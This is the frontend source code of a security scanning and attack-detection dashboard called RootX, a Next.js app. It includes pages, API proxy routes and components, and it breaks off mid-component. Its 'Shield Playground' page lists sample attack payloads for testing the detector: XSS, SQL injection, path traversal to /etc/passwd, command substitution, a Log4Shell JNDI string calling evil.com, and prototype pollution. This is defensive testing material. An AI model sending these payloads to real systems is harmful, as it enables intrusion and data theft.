import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Clock, Target, AlertTriangle, ChevronRight, Trash2 } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Navbar from "@/components/Navbar";

export default function HistoryPage() {
  const [history, setHistory] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [sidebarOpen, setSidebarOpen] = useState(true);

  useEffect(() => { fetchHistory(); }, []);

  const fetchHistory = async () => {
    try {
      const res = await fetch("/api/stats");
      const data = await res.json();
      setHistory(Array.isArray(data) ? data : []);
    } catch {} finally { setLoading(false); }
  };

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col">
        <Navbar title="Scan History" />
        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-4xl mx-auto space-y-3">
            {loading ? <p className="text-gray-400 text-sm">Loading...</p> : history.length === 0 ? <p className="text-gray-400 text-sm">No scans recorded yet.</p> : history.map((h, i) => (
              <motion.div key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.05 }} className="flex items-center justify-between p-4 bg-white/5 border border-white/10 rounded-xl hover:bg-white/[0.07] transition-all">
                <div className="flex items-center gap-4">
                  <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-gray-700 to-gray-800 flex items-center justify-center"><Clock className="w-5 h-5 text-gray-400" /></div>
                  <div><p className="text-sm font-medium">{h.target}</p><p className="text-xs text-gray-400">{new Date(h.created_at || h.timestamp).toLocaleString()}</p></div>
                </div>
                <div className="flex items-center gap-3">
                  <span className={`text-xs px-2 py-0.5 rounded font-medium ${h.severity === "critical" ? "bg-red-500/10 text-red-400" : h.severity === "high" ? "bg-orange-500/10 text-orange-400" : h.severity === "medium" ? "bg-yellow-500/10 text-yellow-400" : "bg-gray-500/10 text-gray-400"}`}>{h.severity}</span>
                  <span className="text-lg font-bold" style={{ color: h.risk_score >= 70 ? "#ef4444" : h.risk_score >= 40 ? "#eab308" : "#22c55e" }}>{h.risk_score}</span>
                  <ChevronRight className="w-4 h-4 text-gray-600" />
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/settings/page.tsx`

```tsx
"use client";

import { useState } from "react";
import { motion } from "framer-motion";
import { Settings as SettingsIcon, Shield, Bell, Globe, Key, Sliders, ToggleLeft, Save } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Navbar from "@/components/Navbar";

export default function SettingsPage() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [settings, setSettings] = useState({ shieldEnabled: true, autoBlock: true, notifyAttacks: true, realtimeMonitor: true, scanTimeout: 60, maxDepth: 3, apiKey: "" });

  const handleSave = () => { alert("Settings saved (demo)"); };

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col">
        <Navbar title="Settings" />
        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-2xl mx-auto space-y-6">
            <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="p-6 bg-white/5 border border-white/10 rounded-xl space-y-4">
              <h2 className="text-sm font-semibold flex items-center gap-2"><Shield className="w-4 h-4 text-cyan-400" /> Shield Configuration</h2>
              {[{key:"shieldEnabled",label:"Enable RootX Shield"},{key:"autoBlock",label:"Auto-block detected attacks"},{key:"notifyAttacks",label:"Attack notifications"},{key:"realtimeMonitor",label:"Real-time monitoring"}].map(({key,label}) => (
                <div key={key} className="flex items-center justify-between">
                  <span className="text-sm text-gray-300">{label}</span>
                  <button onClick={() => setSettings((s: any) => ({...s, [key]: !s[key]}))} className={`w-10 h-5 rounded-full transition-colors ${(settings as any)[key] ? "bg-cyan-500" : "bg-gray-600"}`}>
                    <div className={`w-4 h-4 bg-white rounded-full transition-transform ${(settings as any)[key] ? "translate-x-5" : "translate-x-0.5"}`} />
                  </button>
                </div>
              ))}
            </motion.div>

            <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="p-6 bg-white/5 border border-white/10 rounded-xl space-y-4">
              <h2 className="text-sm font-semibold flex items-center gap-2"><Sliders className="w-4 h-4 text-purple-400" /> Scan Settings</h2>
              <div className="grid grid-cols-2 gap-4">
                <div><label className="text-xs text-gray-400">Timeout (seconds)</label><input type="number" value={settings.scanTimeout} onChange={e => setSettings(s => ({...s, scanTimeout: parseInt(e.target.value) || 60}))} className="w-full mt-1 px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-sm" /></div>
                <div><label className="text-xs text-gray-400">Max Depth</label><input type="number" value={settings.maxDepth} onChange={e => setSettings(s => ({...s, maxDepth: parseInt(e.target.value) || 3}))} className="w-full mt-1 px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-sm" /></div>
              </div>
            </motion.div>

            <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }} className="p-6 bg-white/5 border border-white/10 rounded-xl space-y-4">
              <h2 className="text-sm font-semibold flex items-center gap-2"><Key className="w-4 h-4 text-yellow-400" /> API Key</h2>
              <input value={settings.apiKey} onChange={e => setSettings(s => ({...s, apiKey: e.target.value}))} placeholder="Enter Gemini API key for AI agent" className="w-full px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-sm placeholder-gray-500" />
            </motion.div>

            <button onClick={handleSave} className="flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 transition-all text-sm font-medium"><Save className="w-4 h-4" /> Save Settings</button>
          </div>
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/protected/page.tsx`

```tsx
"use client";

import { useState } from "react";
import { motion } from "framer-motion";
import { Shield, AlertTriangle, CheckCircle, XCircle, Send, Terminal } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Navbar from "@/components/Navbar";

export default function ProtectedPage() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [payload, setPayload] = useState("");
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  const testAttack = async () => {
    if (!payload.trim()) return;
    setLoading(true);
    try {
      const res = await fetch("/api/shield", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ payload }) });
      setResult(await res.json());
    } catch (e: any) { setResult({ error: e.message }); }
    finally { setLoading(false); }
  };

  const examplePayloads = ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd", "$(cat /etc/passwd)", "${jndi:ldap://evil.com/a}", "__proto__.isAdmin=true"];

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col">
        <Navbar title="Shield Playground" />
        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-3xl mx-auto space-y-6">
            <div className="p-6 bg-white/5 border border-white/10 rounded-xl">
              <h2 className="text-lg font-semibold mb-2">RootX Shield Test</h2>
              <p className="text-sm text-gray-400 mb-4">Test the attack detection engine by sending payloads below.</p>
              <div className="flex gap-3 mb-4">
                <input value={payload} onChange={e => setPayload(e.target.value)} placeholder="Enter attack payload..." className="flex-1 px-4 py-3 bg-black/40 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500/50" onKeyDown={e => e.key === "Enter" && testAttack()} />
                <button onClick={testAttack} disabled={loading} className="px-5 py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 disabled:opacity-50 transition-all"><Send className="w-4 h-4" /></button>
              </div>
              <div className="flex flex-wrap gap-2">
                {examplePayloads.map((p) => (<button key={p} onClick={() => setPayload(p)} className="px-3 py-1.5 text-xs bg-white/5 border border-white/10 rounded-lg hover:bg-white/10 transition-all font-mono">{p.substring(0, 30)}{p.length > 30 ? "..." : ""}</button>))}
              </div>
            </div>

            {result && (
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className={`p-6 border rounded-xl ${result.blocked ? "bg-red-500/10 border-red-500/30" : "bg-green-500/10 border-green-500/30"}`}>
                <div className="flex items-center gap-3 mb-4">
                  {result.blocked ? <XCircle className="w-6 h-6 text-red-400" /> : <CheckCircle className="w-6 h-6 text-green-400" />}
                  <div><p className="font-semibold">{result.blocked ? "Attack Blocked" : "Payload Allowed"}</p><p className="text-sm text-gray-400">{result.reason || "No suspicious patterns detected"}</p></div>
                </div>
                {result.threats?.length > 0 && (
                  <div className="space-y-2">
                    <p className="text-xs font-medium text-gray-400 uppercase">Detected Threats</p>
                    {result.threats.map((t: any, i: number) => (
                      <div key={i} className="flex items-center gap-2 p-2 bg-black/30 rounded-lg"><AlertTriangle className="w-3 h-3 text-red-400" /><span className="text-xs font-mono text-red-300">{t.type}</span><span className="text-xs text-gray-400">({t.severity})</span></div>
                    ))}
                  </div>
                )}
              </motion.div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/mitm/page.tsx`

```tsx
"use client";

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Shield, AlertTriangle, Activity, XCircle, CheckCircle, Terminal, Server } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Navbar from "@/components/Navbar";

export default function MitmPage() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [logs, setLogs] = useState<string[]>([]);
  const [running, setRunning] = useState(false);

  useEffect(() => {
    const ws = new WebSocket(`ws://${window.location.hostname}:8081`);
    ws.onmessage = (e) => { setLogs(prev => [...prev.slice(-99), `[MITM] ${e.data}`]); };
    ws.onopen = () => setRunning(true);
    ws.onclose = () => setRunning(false);
    return () => ws.close();
  }, []);

  return (
    <div className="flex h-screen bg-gray-950 text-white">
      <Sidebar isOpen={sidebarOpen} onToggle={() => setSidebarOpen(!sidebarOpen)} />
      <div className="flex-1 flex flex-col">
        <Navbar title="MITM Proxy" />
        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-4xl mx-auto">
            <div className="flex items-center justify-between mb-6">
              <div><h2 className="text-lg font-semibold">MITM Proxy Monitor</h2><p className="text-sm text-gray-400">Intercept and inspect HTTP/HTTPS traffic for attack analysis</p></div>
              <div className="flex items-center gap-2">{running ? <><CheckCircle className="w-4 h-4 text-green-400" /><span className="text-sm text-green-400">Proxy Running</span></> : <><XCircle className="w-4 h-4 text-red-400" /><span className="text-sm text-red-400">Stopped</span></>}</div>
            </div>
            <div className="p-4 bg-black/60 border border-white/5 rounded-xl font-mono text-xs h-[60vh] overflow-y-auto">
              {logs.length === 0 ? <p className="text-gray-500">Waiting for traffic...</p> : logs.map((l, i) => <div key={i} className="text-gray-400 py-0.5">{l}</div>)}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
```

## 📁 `frontend/app/api/route.ts`

```ts
import { NextResponse } from "next/server";

export async function GET() {
  return NextResponse.json({ name: "RootX API", version: "3.0.0", status: "operational" });
}
```

## 📁 `frontend/app/api/scan/route.ts`

```ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const { target } = await req.json();
    if (!target) return NextResponse.json({ error: "Target URL required" }, { status: 400 });
    
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/scan`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ target }),
    });
    const data = await response.json();
    return NextResponse.json(data);
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

## 📁 `frontend/app/api/stats/route.ts`

```ts
import { NextResponse } from "next/server";

export async function GET() {
  try {
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/stats`);
    const data = await response.json();
    return NextResponse.json(data);
  } catch { return NextResponse.json([]); }
}
```

## 📁 `frontend/app/api/chat/route.ts`

```ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const { message, history } = await req.json();
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/chat`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message, history }),
    });
    const data = await response.json();
    return NextResponse.json(data);
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

## 📁 `frontend/app/api/shield/route.ts`

```ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const { payload } = await req.json();
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/shield/test`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ payload }),
    });
    const data = await response.json();
    return NextResponse.json(data);
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

## 📁 `frontend/app/api/report/route.ts`

```ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const scanData = await req.json();
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/report`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(scanData),
    });
    const pdfBuffer = await response.arrayBuffer();
    return new NextResponse(pdfBuffer, { headers: { "Content-Type": "application/pdf", "Content-Disposition": "attachment; filename=rootx-report.pdf" } });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

## 📁 `frontend/app/api/monitor/route.ts`

```ts
import { NextResponse } from "next/server";

export async function GET() {
  try {
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const [shieldRes, scansRes] = await Promise.all([
      fetch(`${backendUrl}/api/shield/stats`),
      fetch(`${backendUrl}/api/stats`),
    ]);
    const shieldStats = await shieldRes.json();
    const recentScans = await scansRes.json();
    return NextResponse.json({ shield: shieldStats, scans: Array.isArray(recentScans) ? recentScans : [] });
  } catch { return NextResponse.json({ shield: {}, scans: [] }); }
}
```

## 📁 `frontend/app/api/latest-scan/route.ts`

```ts
import { NextResponse } from "next/server";

export async function GET() {
  try {
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/latest-scan`);
    const data = await response.json();
    return NextResponse.json(data);
  } catch { return NextResponse.json(null); }
}
```

## 📁 `frontend/app/api/ai/explain/route.ts`

```ts
import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const { vulnerability } = await req.json();
    const backendUrl = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
    const response = await fetch(`${backendUrl}/api/ai/explain`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ vulnerability }),
    });
    const data = await response.json();
    return NextResponse.json(data);
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
```

## 📁 `frontend/lib/supabase.ts`

```ts
import { createClient } from "@supabase/supabase-js";

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || "http://127.0.0.1:54321";
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxj0niE8Tpp24k1kmTvD8RcV6kvoRs";

export const supabase = createClient(supabaseUrl, supabaseKey);
```

## 📁 `frontend/lib/socket.ts`

```ts
"use client";

import { io } from "socket.io-client";

const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";

export const socket = io(API_URL, {
  autoConnect: false,
  transports: ["websocket", "polling"],
});

export function connectSocket() { if (!socket.connected) socket.connect(); }
export function disconnectSocket() { if (socket.connected) socket.disconnect(); }
```

## 📁 `frontend/lib/api.ts`

```ts
const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";

async function apiFetch(path: string, options?: RequestInit) {
  const res = await fetch(`${API_URL}/api${path}`, {
    headers: { "Content-Type": "application/json" },
    ...options,
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: res.statusText }));
    throw new Error(err.error || `API error: ${res.status}`);
  }
  return res.json();
}

export const api = {
  scan: (target: string) => apiFetch("/scan", { method: "POST", body: JSON.stringify({ target }) }),
  stats: () => apiFetch("/stats"),
  health: () => apiFetch("/health"),
  shieldStats: () => apiFetch("/shield/stats"),
  shieldLog: (limit?: number) => apiFetch(`/shield/log${limit ? `?limit=${limit}` : ""}`),
  blockIP: (ip: string, reason?: string) => apiFetch("/shield/block", { method: "POST", body: JSON.stringify({ ip, reason }) }),
  unblockIP: (ip: string) => apiFetch("/shield/unblock", { method: "POST", body: JSON.stringify({ ip }) }),
  chat: (message: string, history?: any[]) => apiFetch("/chat", { method: "POST", body: JSON.stringify({ message, history }) }),
  report: (scanData: any) => apiFetch("/report", { method: "POST", body: JSON.stringify(scanData) }),
  monitor: () => apiFetch("/monitor"),
  latestScan: () => apiFetch("/latest-scan"),
  aiExplain: (vulnerability: any) => apiFetch("/ai/explain", { method: "POST", body: JSON.stringify({ vulnerability }) }),
};
```

## 📁 `frontend/components/ActivityFeed.tsx`

```tsx
"use client";

import { motion } from "framer-motion";
import { Activity, AlertTriangle, Shield, CheckCircle, Clock } from "lucide-react";
import { useEffect, useState } from "react";
import { socket } from "@/lib/socket";

export default function ActivityFeed() {
  const [activities, setActivities] = useState<any[]>([]);

  useEffect(() => {
    socket.on("scan:complete", (data: any) => {
      setActivities(prev => [{ type: "scan", message: `Scan complete: ${data.target}`, severity: data.severity, timestamp: new Date().toISOString() }, ...prev.slice(0, 49)]);
    });
    socket.on("shield:attack", (data: any) => {
      setActivities(prev => [{ type: "attack", message: `Attack detected: ${data.type} from ${data.ip}`, severity: data.severity, timestamp: new Date().toISOString() }, ...prev.slice(0, 49)]);
    });
    return () => { socket.off("scan:complete"); socket.off("shield:attack"); };
  }, []);

  const getIcon = (type: string) => {
    switch (type) {
      case "attack": return <AlertTriangle className="w-4 h-4 text-red-400" />;
      case "scan": return <Shield className="w-4 h-4 text-cyan-400" />;
      default: return <Activity className="w-4 h-4 text-gray-400" />;
    }
  };

  return (
    <div className="space-y-2">
      {activities.length === 0 ? <p className="text-sm text-gray-500 text-center py-8">No recent activity</p> : activities.map((a, i) => (
        <motion.div key={i} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.02 }} className="flex items-start gap-3 p-3 bg-white/[0.03] border border-white/5 rounded-lg">
          {getIcon(a.type)}
          <div className="flex-1 min-w-0"><p className="text-xs text-gray-300 truncate">{a.message}</p><p className="text-[10px] text-gray-500 mt-0.5">{new Date(a.timestamp).toLocaleTimeString()}</p></div>
        </motion.div>
      ))}
    </div>
  );
}
```

## 📁 `frontend/components/attackmonitor.tsx`

```tsx
"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, AlertTriangle, XCircle, Activity, Terminal } from "lucide-react";

export default function AttackMonitor() {
  const [attacks, setAttacks] = useState<any[]>([]);
  const [stats, setStats] = useState({ total: 0, blocked: 0, critical: 0 });

  useEffect(() => {
    const fetchAttacks = async () => {
      try {
        const res = await fetch("/api/shield/log?limit=20");
        if (res.ok) setAttacks(await res.json());
        const statsRes = await fetch("/api/shield/stats");
        if (statsRes.ok) setStats(await statsRes.json());
      } catch {}
    };
    fetchAttacks();
    const interval = setInterval(fetchAttacks, 5000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-3 gap-3">
        <div className="p-3 bg-white/5 border border-white/10 rounded-xl text-center"><p className="text-2xl font-bold text-gray-200">{stats.total}</p><p className="text-xs text-gray-400">Total</p></div>
        <div className="p-3 bg-white/5 border border-white/10 rounded-xl text-center"><p className="text-2xl font-bold text-red-400">{stats.blocked}</p><p className="text-xs text-gray-400">Blocked</p></div>
        <div className="p-3 bg-white/5 border border-white/10 rounded-xl text-center"><p className="text-2xl font-bold text-orange-400">{stats.critical}</p><p className="text-xs text-gray-400">Critical</p></div>
      </div>
      <div className="space-y-2 max-h-60 overflow-y-auto">
        <AnimatePresence>
          {attacks.map((a, i) => (
            <motion.div key={i} initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} exit={{ opacity: 0, height: 0 }} className="flex items-center gap-2 p-2 bg-red-500/5 border border-red-500/10 rounded-lg text-xs">
              <AlertTriangle className="w-3 h-3 text-red-400 flex-shrink-0" />
              <span className="font-mono text-red-300 flex-shrink-0">{a.type}</span>
              <span className="text-gray-400 truncate">{a.ip}</span>
              <span className="text-gray-500 ml-auto">{new Date(a.timestamp).toLocaleTimeString()}</span>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  );
}
```

## 📁 `frontend/components/SecurityCard.tsx`

```tsx
"use client";

import { motion } from "framer-motion";
import { LucideIcon } from "lucide-react";

interface SecurityCardProps {
  title: string;
  value: string | number;
  icon: LucideIcon;
  color: string;
}

const colorMap: Record<string, { bg: string; text: string; iconBg: string }> = {
  red: { bg: "bg-red-500/10 border-red-500/30", text: "text-red-400", iconBg: "bg-red-500/20" },
  orange: { bg: "bg-orange-500/10 border-orange-500/30", text: "text-orange-400", iconBg: "bg-orange-500/20" },
  yellow: { bg: "bg-yellow-500/10 border-yellow-500/30", text: "text-yellow-400", iconBg: "bg-yellow-500/20" },
  green: { bg: "bg-green-500/10 border-green-500/30", text: "text-green-400", iconBg: "bg-green-500/20" },
  blue: { bg: "bg-blue-500/10 border-blue-500/30", text: "text-blue-400", iconBg: "bg-blue-500/20" },
  purple: { bg: "bg-purple-500/10 border-purple-500/30", text: "text-purple-400", iconBg: "bg-purple-500/20" },
};

export default function SecurityCard({ title, value, icon: Icon, color }: SecurityCardProps) {
  const c = colorMap[color] || colorMap.blue;
  return (
    <motion.div whileHover={{ scale: 1.02 }} className={`p-4 rounded-xl border ${c.bg}`}>
      <div className="flex items-center justify-between mb-2">
        <span className="text-xs font-medium text-gray-400 uppercase tracking-wider">{title}</span>
        <div className={`w-8 h-8 rounded-lg ${c.iconBg} flex items-center justify-center`}><Icon className={`w-4 h-4 ${c.text}`} /></div>
      </div>
      <p className={`text-2xl font-bold ${c.text} truncate`}>{value}</p>
    </motion.div>
  );
}
```

## 📁 `frontend/components/scannerengine.tsx`

```tsx
"use client";

import { useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Search, Shield, AlertTriangle, Bug, RefreshCw, Download, Globe, Gauge, Terminal, XCircle, CheckCircle, Clock, Loader2 } from "lucide-react";
import SecurityCard from "@/components/SecurityCard";
import { BarChart, Bar, PieChart, Pie, Cell, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from "recharts";

const SEVERITY_COLORS: Record<string, string> = { critical: "#ef4444", high: "#f97316", medium: "#eab308", low: "#3b82f6", info: "#6b7280" };
const MODULES = ["Baseline", "Shield", "AI Agent", "Headers", "Cookies", "SSL", "SQLi", "XSS", "Sensitive Files", "Admin Panels", "Tech Detect"];

export default function ScannerEngine() {
  const [target, setTarget] = useState("");
  const [scanning, setScanning] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [error, setError] = useState("");
  const [progress, setProgress] = useState<string[]>([]);
  const [currentModule, setCurrentModule] = useState("");
  const [showDetail, setShowDetail] = useState<string | null>(null);

  const runScan = useCallback(async () => {
    if (!target.trim() || scanning) return;
    setScanning(true); setError(""); setResult(null); setProgress([]); setCurrentModule("");
    setProgress(prev => [...prev, `Initializing scan on ${target}...`]);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 120000);
    try {
      let idx = 0;
      const moduleTimer = setInterval(() => {
        if (idx < MODULES.length) { setCurrentModule(MODULES[idx]); setProgress(p => [...p, `Running ${MODULES[idx]} module...`]); idx++; }
        else clearInterval(moduleTimer);
      }, 500);
      const res = await fetch("/api/scan", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: target.startsWith("http") ? target : `https://${target}` }),
        signal: controller.signal,
      });
      clearInterval(moduleTimer);
      if (!res.ok) throw new Error(`Scan failed: ${res.statusText}`);
      const data = await res.json();
      setResult(data);
      setProgress(p => [...p, `Scan complete. Risk score: ${data.riskScore} (${data.severity})`]);
    } catch (err: any) {
      if (err.name === "AbortError") setError("Scan timed out after 120 seconds");
      else setError(err.message);
      setProgress(p => [...p, `Error: ${err.message}`]);
    } finally { clearTimeout(timeout); setScanning(false); setCurrentModule(""); }
  }, [target, scanning]);

  const getTopVulns = () => {
    if (!result?.vulnerabilities) return [];
    const counts: Record<string, { count: number; maxSeverity: string }> = {};
    result.vulnerabilities.forEach((v: any) => {
      const t = v.type || "Unknown";
      if (!counts[t]) counts[t] = { count: 0, maxSeverity: v.severity || "info" };
      counts[t].count++;
      const order = ["info","low","medium","high","critical"];
      if (order.indexOf(v.severity) > order.indexOf(counts[t].maxSeverity)) counts[t].maxSeverity = v.severity;
    });
    return Object.entries(counts).sort((a: any, b: any) => b[1].count - a[1].count).slice(0, 10).map(([type, data]) => ({ type, ...data as any }));
  };

  const downloadReport = () => {
    if (!result) return;
    const blob = new Blob([JSON.stringify(result, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = `rootx-scan-${Date.now()}.json`; a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6">
      {/* Scan Input */}
      <div className="flex gap-3">
        <input value={target} onChange={e => setTarget(e.target.value)} placeholder="Enter target URL (e.g. https://example.com)" className="flex-1 px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/20 transition-all" onKeyDown={e => e.key === "Enter" && runScan()} />
        <button onClick={runScan} disabled={scanning || !target.trim()} className="px-6 py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl hover:from-cyan-400 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center gap-2 text-sm font-medium">
          {scanning ? <><RefreshCw className="w-4 h-4 animate-spin" /> Scanning</> : <><Search className="w-4 h-4" /> Scan</>}
        </button>
      </div>

      {error && <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-xl text-sm text-red-400">{error}</div>}

      {/* Progress */}
      {scanning && (
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="p-4 bg-white/5 border border-white/10 rounded-xl">
          <div className="flex items-center gap-2 mb-3">
            <Loader2 className="w-4 h-4 animate-spin text-cyan-400" />
            <span className="text-sm font-medium">{currentModule ? `Running ${currentModule}...` : "Scanning..."}</span>
          </div>
          <div className="h-1 bg-white/10 rounded-full overflow-hidden">
            <motion.div className="h-full bg-gradient-to-r from-cyan-500 to-blue-600 rounded-full" animate={{ width: ["0%", "100%"] }} transition={{ duration: 60, ease: "linear" }} />
          </div>
          <div className="mt-3 space-y-0.5 max-h-32 overflow-y-auto">
            {progress.map((p, i) => <div key={i} className="text-xs text-gray-400 font-mono">{p}</div>)}
          </div>
        </motion.div>
      )}

      {/* Results */}
      {result && !scanning && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          {/* Score Ring */}
          <div className="flex justify-center">
            <div className="relative w-36 h-36">
              <svg className="transform -rotate-90 w-36 h-36" viewBox="0 0 144 144">
                <circle cx="72" cy="72" r="64" fill="none" stroke="#ffffff10" strokeWidth="8" />
                <motion.circle cx="72" cy="72" r="64" fill="none" stroke={result.riskScore >= 70 ? "#ef4444" : result.riskScore >= 40 ? "#eab308" : "#22c55e"} strokeWidth="8" strokeLinecap="round" initial={{ strokeDasharray: 402, strokeDashoffset: 402 }} animate={{ strokeDashoffset: 402 - (402 * result.riskScore) / 100 }} transition={{ duration: 1.5, ease: "easeOut" }} />
              </svg>
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                <span className="text-3xl font-bold">{result.riskScore}</span>
                <span className="text-xs text-gray-400 uppercase">{result.severity}</span>
              </div>
            </div>
          </div>

          {/* Summary Cards */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <SecurityCard title="Risk Score" value={result.riskScore} icon={Gauge} color={result.riskScore >= 70 ? "red" : result.riskScore >= 40 ? "yellow" : "green"} />
            <SecurityCard title="Severity" value={result.severity?.toUpperCase()} icon={AlertTriangle} color={result.severity === "critical" ? "red" : result.severity === "high" ? "orange" : "yellow"} />
            <SecurityCard title="Vulnerabilities" value={result.vulnerabilities?.length || 0} icon={Bug} color="purple" />
            <SecurityCard title="Target" value={result.target} icon={Globe} color="blue" />
          </div>

          {/* Charts */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-white/5 border border-white/10 rounded-xl">
              <h3 className="text-sm font-medium mb-4">Severity Distribution</h3>
              <ResponsiveContainer width="100%" height={200}>
                <PieChart>
                  <Pie data={(() => { const s: Record<string,number> = {}; result.vulnerabilities?.forEach((v: any) => { const sev = v.severity || "info"; s[sev] = (s[sev] || 0) + 1; }); return Object.entries(s).map(([severity, count]) => ({ severity, count })); })()} dataKey="count" nameKey="severity" cx="50%" cy="50%" outerRadius={80}>
